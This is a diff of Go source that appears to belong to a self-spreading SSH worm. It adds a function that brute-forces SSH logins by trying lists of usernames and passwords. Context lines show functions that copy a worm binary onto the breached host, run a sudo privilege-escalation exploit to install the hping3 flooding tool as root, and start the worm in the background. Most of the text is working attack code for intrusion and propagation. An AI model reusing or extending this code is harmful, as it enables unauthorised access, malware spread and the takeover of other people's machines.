@@ -21,7 +21,7 @@ var (
 	timeout = time.Minute
 )
 
-func GuessSSHConnection (ip string) bool {
+func GuessSSHConnectionFromFile (ip string) bool {
 	var client *ssh.Client
 	var session *ssh.Session
 
@@ -56,6 +56,31 @@ func GuessSSHConnection (ip string) bool {
 
 	if err_users := user_scanner.Err(); err_users != nil {
 		//log.Fatal(err_users)
+	}
+
+	if (session != nil){
+		return true
+	} else {
+		return false
+	}
+}
+
+func GuessSSHConnectionV2 (ip string) bool {
+	var client *ssh.Client
+	var session *ssh.Session
+
+	timeout = time.Minute
+
+	for i := 0; i < len(users_const); i++ {
+		if (client == nil && session == nil) {
+			username = users_const[i]
+			for j := 0; j < len(pwds_const); j++ {
+				if (client == nil && session == nil) {
+					password = pwds_const[j]
+					client, session = OpenSSHConnection(ip)
+				}
+			}
+		}
 	}
 
 	if (session != nil){
@@ -125,7 +150,7 @@ func SshInfect(ip string, filename string) string {
 	worm = GetFile(worm_dir + "/" + filename)
 	session.Stdin = bytes.NewReader(worm)
 	session.CombinedOutput("cat > " + worm_dir + "/" + filename)
-	
+
 	return "Finished infecting"
 }
 
@@ -141,10 +166,10 @@ func SshExploit(ip string) string {
 	exploit = GetFile(worm_dir + "/" + sudo_exploit_filename)
 	session.Stdin = bytes.NewReader(exploit)
 	session.CombinedOutput(
-		"chmod u+x " + worm_dir + "/worm && " + 
-		"chmod u+x " + worm_dir + "/" + sudo_exploit_filename + " && " + 
+		"chmod u+x " + worm_dir + "/worm && " +
+		"chmod u+x " + worm_dir + "/" + sudo_exploit_filename + " && " +
 		"echo '/bin/sh -c \"/usr/bin/apt install hping3 -y\" > /dev/null' | " + worm_dir + "/" + sudo_exploit_filename + " && " +
-		"touch " + worm_dir + "/is_this_working" + " && " + 
+		"touch " + worm_dir + "/is_this_working" + " && " +
 		"nohup echo '/bin/sh -c " + worm_dir + "/worm' | " + worm_dir + "/" + sudo_exploit_filename + " &")
 
 	return "Finished exploiting"
